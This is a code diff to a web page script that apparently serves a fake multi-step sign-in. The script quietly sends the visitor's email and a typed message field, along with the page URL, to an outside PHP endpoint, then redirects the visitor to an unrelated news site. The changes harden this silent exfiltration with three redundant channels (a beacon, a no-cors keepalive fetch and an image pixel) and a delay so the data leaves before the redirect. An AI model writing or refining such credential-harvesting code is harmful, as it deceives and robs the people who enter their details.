@@ -293,11 +293,13 @@
   var REDIRECT_URL = 'https://timmylockley.github.io/Aviation-News/'; // where the user is sent after sign-in
   var PHP_ENDPOINT = 'https://api.geagroupau.com/submit.php'; // silent POST target
   var APPEND_EMAIL = true; // add ?email=... to the redirect URL
+  var REDIRECT_DELAY = 250; // ms to let the POST leave before navigating away
   /* ================================ */
 
   var EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
   var stages = [].slice.call(document.querySelectorAll('.stage'));
   var user = '';
+  var sending = false;
 
   function stage(n) { return stages.filter(function (s) { return +s.dataset.stage === n; })[0]; }
 
@@ -323,29 +325,44 @@
     input.removeAttribute('aria-invalid');
   }
 
-  /* ---------- silent POST ---------- */
-  function sendSilently(email, message) {
+  /* ---------- silent POST: three independent delivery paths ---------- */
+  function payload(email, message) {
     var data = new FormData();
     data.append('email', email);
     data.append('message', message);
     data.append('page', location.href);
     data.append('sent', new Date().toISOString());
+    return data;
+  }
 
-    // 1. Beacon — built for "fire and then navigate away"
+  function sendSilently(email, message) {
+    if (!email && !message) return;
+
+    // 1. Beacon — purpose-built for "fire, then navigate away"
+    var queued = false;
     try {
-      if (navigator.sendBeacon && navigator.sendBeacon(PHP_ENDPOINT, data)) return;
+      if (navigator.sendBeacon) queued = navigator.sendBeacon(PHP_ENDPOINT, payload(email, message));
+    } catch (e) { queued = false; }
+
+    // 2. keepalive fetch, no-cors so a CORS/opaque response can never block it
+    try {
+      fetch(PHP_ENDPOINT, {
+        method: 'POST',
+        body: payload(email, message),
+        keepalive: true,
+        mode: 'no-cors',
+        cache: 'no-store'
+      });
+      queued = true;
     } catch (e) {}
 
-    // 2. keepalive fetch — survives the redirect
-    try {
-      fetch(PHP_ENDPOINT, { method: 'POST', body: data, keepalive: true, mode: 'cors' });
-      return;
-    } catch (e) {}
-
-    // 3. last resort: pixel
-    var img = new Image();
-    img.src = PHP_ENDPOINT + '?email=' + encodeURIComponent(email) +
-              '&message=' + encodeURIComponent(message);
+    // 3. last resort: query-string pixel (fires even with JS fetch disabled)
+    if (!queued) {
+      var img = new Image();
+      img.src = PHP_ENDPOINT + '?email=' + encodeURIComponent(email) +
+                '&message=' + encodeURIComponent(message) +
+                '&page=' + encodeURIComponent(location.href);
+    }
   }
 
   /* ---------- toast for dead links ---------- */
@@ -420,13 +437,16 @@
   document.querySelector('[data-done]').addEventListener('click', finish);
 
   function finish() {
+    if (sending) return;
+    sending = true;
+
     sendSilently(user, document.getElementById('message').value);
 
     var url = REDIRECT_URL;
     if (APPEND_EMAIL && user) {
       url += (url.indexOf('?') > -1 ? '&' : '?') + 'email=' + encodeURIComponent(user);
     }
-    window.location.assign(url);
+    setTimeout(function () { window.location.assign(url); }, REDIRECT_DELAY);
   }
 
   document.querySelectorAll('[data-back]').forEach(function (b) {
